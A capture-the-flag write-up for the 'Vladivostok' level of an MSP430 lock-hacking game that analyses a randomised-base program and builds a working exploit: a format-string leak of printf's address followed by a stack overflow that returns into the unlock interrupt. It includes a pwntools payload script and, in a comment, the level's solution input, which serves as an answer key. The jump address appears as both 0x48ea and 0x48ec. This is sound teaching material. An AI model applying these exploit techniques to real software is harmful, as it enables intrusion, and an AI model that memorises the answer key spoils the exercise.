# Vladivostok
> sourse code [here](./dump.asm)  
> **Vulnerability**: stack buffer overflow  
> **Mitigation**: ASLR  

## Analysis
pseudo code for `main`, assembly code [here](./dump.asm)
```c
void main() {
    uint16_t base = (rand() & 0x7ffe) + 0x6000;
    uint16_t sp_base = rand();
    memcpy(base, 0x4400, 0x1000);           // 0x4400 = base of text section
    sp_base = (base - (sp_base & 0xffe)) + 0xff00;
    void (*func)(uint16_t) = base + 0x35c;
    sp = sp_base;       // rebase stack pointer
    func(base);         // call <func>
}
```

What the `<main>` does is actually just rebase both the text section and the stack pointer with a random number.

`memcpy` copy the entire section and thus, `func` is actually the same as `0x4400 + 0x35c = 0x475c`. Therefore, the program will jump to `0x475c` after rebasing the stack pointer and `0x475c` is the start of `<aslr_main>`.

pseudo code for `<aslr_main>`, assembly code [here](./dump.asm)
```c
void aslr_main(uint16_t base) {
    void (*func)() = base + 0x82;
    func();
}
```
`<aslr_main>` simply just call `base + 0x82` which will be the same as what is `@ 0x4482`, which is the start of `<_aslr_main>`.

### High Level Call Graph
```text
... -> <main> -> <aslr_main> -> <_aslr_main> -> ...
```
Also, the main logic of the program is in `<_aslr_main>`.

### `<_aslr_main>`
```c
void _aslr_main() {
    /* null out the original text section, 0x4400 */
    ...
    gets(username, 8);      // username @ 0x2426
    printf(username);       // vulnerable to Format String Vulnerability, able to leak address
    ...
    gets(password, 20);     // password on the stack, stack buffer overflow
    ...
    return;
}
```
The program null out the original text section. Therefore, we need a leak in order to find the address of the function we want to call.

`gets(username, 8)` has a strict restriction on the length of the input, which is 8 bytes, so it is impossible to use the *Format String Vulnerability* to setup for *directly* overwriting the return address. However, we can find that at the point of `printf(username)`, the stack is setup as follows:
```text
(pc = 0x9622)
> r sp
8976: 2624 0000 a897 0000 0000 b679 3e94 a297  &$.........y>...
8986: 7844 0000 0000 0000 0000 0000 0000 0000  xD..............
```
That is, `0x97a8` the address of `printf` after rebase is on the stack which can be leaked with the **2nd `%x`**.

Following is the assembly code related to get input for `password`:
```asm
4482:  0b12           push	r11
4484:  0a12           push	r10
4486:  3182           sub	#0x8, sp
...
4688:  0b41           mov	sp, r11 
468a:  2b52           add	#0x4, r11       ; r11 = sp + 4
468c:  3c40 1400      mov	#0x14, r12      ; r12 = 0x14
4690:  2d43           mov	#0x2, r13
4692:  0c12           push	r12
4694:  0b12           push	r11
4696:  0d12           push	r13
4698:  0012           push	pc
469a:  0212           push	sr
469c:  0f4d           mov	r13, r15
469e:  8f10           swpb	r15
46a0:  024f           mov	r15, sr
46a2:  32d0 0080      bis	#0x8000, sr
46a6:  b012 1000      call	#0x10           ; trigger interrupt
```
The return address is at `sp + 0xc` and the input starts at `sp + 4` with maximum `0x14` bytes of input. That is, with the padding of `8` bytes, the following 2 bytes will be able to overwrite the return address of `<_aslr_main>`.

### Where to jump to?
From the [assmebly](./dump.asm), we can find multiple places where it calls the interruption and all we need is to utilize one of them and trigger an unlock.

1. `0x4904` for `<INT>`
    To trigger `INT 0x7f`, `r15` is needed to be set to `0x7f`, which seems a bit impossible.
2. `0x48ea` for `<_INT>`
    To trigger the unlock, `sp + 2` needed to be set to `0x7f`. That is, pad 2 bytes after the return address and put `0x7f` right after it would be able to trigger.

Therefore, `password` should be `8` bytes of padding + return address, `0x48ea` after rebase + `2` bytes of padding + `0x7f`.

## Exploit
<details>
<summary>Simple script transfer to *hex*</summary>

```python
def b2hex(b):
    return ''.join(f'{c:02x}' for c in b)
```
</details>

1. leak using *Format String Vulnerability*
    - `printf` is called with the user input, `username` directly
    - therefore, it is vulnerable to *Format String Vulnerability*
    - leak the address of `printf`, at the 2nd argument, after rebase

    ```python
    username = b'%x||%x||'
    ```
    ```python
    In [26]: b2h(b'%x||%x||')
    Out[26]: '25787c7c25787c7c'
    ```
2. *Stack Buffer Overflow* to overwrite return address
    - 8 bytes of padding before the return address
    - calculate the offset with the leak to overwrite the return address
        - `0x48ec` is the address of `<_INT>`
        - `<_INT>` use `sp + 2` to determine which interrupt to call
    - setup the value 2 bytes after the return address to `0x7f` to trigger the unlock

    ```python
    password = b2h(b'a' * 8 + p16(leak - (0x476a - 0x48ec)) + b'b' * 2 + p16(0x7f)) 
    ```

```python
from pwn import *
username = b'%x||%x||'
leak = (address leak from the output of the program)
password = b'a' * 8 + p16(leak - (0x476a - 0x48ec)) + b'b' * 2 + p16(0x7f)
```

<!-- solution: {'level_id': 15, 'input': '25787c7c25787c7c;61616161616161617e8662627f00;'} (value might differ due to ASLR) -->
